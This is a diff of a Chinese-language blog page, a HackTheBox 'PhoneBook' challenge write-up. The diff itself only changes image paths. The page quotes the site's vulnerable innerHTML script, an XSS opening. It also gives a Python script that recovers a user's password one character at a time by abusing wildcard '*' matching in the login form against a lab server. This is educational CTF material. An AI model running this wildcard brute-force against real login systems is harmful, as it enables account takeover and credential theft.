@@ -13,16 +13,16 @@
 <meta property="og:site_name" content="忘返">
 <meta property="og:description" content="题目 思路题目给出的网页是这样  看到HTML中有这样一段代码，还以为这题是个DOM XSS(事实上也确实有XSS) 1234567891011&lt;script&gt;  const queryString &#x3D; window.location.search;if (queryString) &amp;#123;  const urlParams &#x3D; new URLSearchParams(queryS">
 <meta property="og:locale">
-<meta property="og:image" content="https://7mitu.github.io/image-1.png">
-<meta property="og:image" content="https://7mitu.github.io/image-2.png">
-<meta property="og:image" content="https://7mitu.github.io/image-3.png">
-<meta property="og:image" content="https://7mitu.github.io/image-4.png">
+<meta property="og:image" content="https://7mitu.github.io/2023/08/22/HackTheBox_PhoneBook_WriteUP/image-1.png">
+<meta property="og:image" content="https://7mitu.github.io/2023/08/22/HackTheBox_PhoneBook_WriteUP/image-2.png">
+<meta property="og:image" content="https://7mitu.github.io/2023/08/22/HackTheBox_PhoneBook_WriteUP/image-3.png">
+<meta property="og:image" content="https://7mitu.github.io/2023/08/22/HackTheBox_PhoneBook_WriteUP/image-4.png">
 <meta property="article:published_time" content="2023-08-22T01:15:09.000Z">
 <meta property="article:modified_time" content="2023-08-22T01:37:11.252Z">
 <meta property="article:author" content="忘返">
 <meta property="article:tag" content="HackTheBox">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://7mitu.github.io/image-1.png">
+<meta name="twitter:image" content="https://7mitu.github.io/2023/08/22/HackTheBox_PhoneBook_WriteUP/image-1.png">
   
     <link rel="alternate" href="/atom.xml" title="忘返" type="application/atom+xml">
   
@@ -107,16 +107,16 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="/image-1.png" alt="Who is lucky enough to be included in the phonebook?"></p>
+        <h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="/2023/08/22/HackTheBox_PhoneBook_WriteUP/image-1.png" alt="Who is lucky enough to be included in the phonebook?"></p>
 <h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>题目给出的网页是这样</p>
-<p><img src="/image-2.png" alt="index"></p>
+<p><img src="/2023/08/22/HackTheBox_PhoneBook_WriteUP/image-2.png" alt="index"></p>
 <p>看到HTML中有这样一段代码，还以为这题是个DOM XSS(事实上也确实有XSS)</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> queryString = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">if</span> (queryString) &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> urlParams = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(queryString);</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> message = urlParams.<span class="title function_">get</span>(<span class="string">&#x27;message&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">if</span> (message) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;message&quot;</span>).<span class="property">innerHTML</span> = message;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;message&quot;</span>).<span class="property">style</span>.<span class="property">visibility</span> = <span class="string">&quot;visible&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>但是XSS是需要人触发的，题目中并没有给出任何BOT的信息。</p>
 <p>所以最终的解法要落在登录功能上。</p>
 <h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>登录功能可以通过通配符<code>*</code>进入，登录成功之后是一个只有搜索框的页面（这里忘记截图了）。搜索功能可以找到若干账户的信息。</p>
-<p><img src="/image-3.png" alt="搜索"></p>
+<p><img src="/2023/08/22/HackTheBox_PhoneBook_WriteUP/image-3.png" alt="搜索"></p>
 <p>题目的提示是：<code>Who is lucky enough to be included in the phonebook?</code>，所以我们应该想办法获取能登录的账号密码。</p>
 <p>登录功能可以识别通配符，所以直接写脚本遍历就好了。</p>
 <blockquote>
@@ -130,13 +130,13 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://157.245.43.189:30403/login&quot;</span></span><br><span class="line">value = <span class="string">&#x27;&#x27;</span></span><br><span class="line">flag = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(flag):</span><br><span class="line">    flag = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">126</span>,<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">chr</span>(i)==<span class="string">&#x27;*&#x27;</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        password = value + <span class="built_in">chr</span>(i) + <span class="string">&#x27;*&#x27;</span></span><br><span class="line">        data = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;REESE&quot;</span>, <span class="string">&quot;password&quot;</span>: password&#125;</span><br><span class="line">        resp = requests.post(url, data=data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="comment"># print(password+&#x27;\t&#x27;+str(resp.status_code))</span></span><br><span class="line">        <span class="keyword">if</span>(resp.status_code != <span class="number">302</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span>(resp.headers[<span class="string">&#x27;Location&#x27;</span>] == <span class="string">&#x27;/&#x27;</span>):</span><br><span class="line">            value = value+<span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="built_in">print</span>(value)</span><br><span class="line">            flag = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
 
 <p>取得flag：</p>
-<p><img src="/image-4.png" alt="flag"></p>
+<p><img src="/2023/08/22/HackTheBox_PhoneBook_WriteUP/image-4.png" alt="flag"></p>
 <h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p><del>真正的解题思路是看了别人的writeup才明白的，通配符这是真没想到……</del></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://7mitu.github.io/2023/08/22/HackTheBox_PhoneBook_WriteUP/" data-id="clllrw16b000698y5f3iuf2uf" data-title="HackTheBox PhoneBook WriteUP" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
+      <a data-url="https://7mitu.github.io/2023/08/22/HackTheBox_PhoneBook_WriteUP/" data-id="clllrzxjl00033ky5bl524t0x" data-title="HackTheBox PhoneBook WriteUP" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
       
       
       
